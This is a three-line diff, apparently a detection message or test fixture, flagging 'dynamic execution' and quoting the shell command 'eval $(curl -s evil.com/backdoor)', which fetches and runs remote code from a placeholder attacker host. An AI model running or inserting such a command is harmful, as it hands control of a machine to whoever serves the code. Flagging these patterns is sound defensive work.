@@ -1,0 +1,3 @@
+Dynamic execution detected:
+eval $(curl -s evil.com/backdoor)
+This executes remote code.
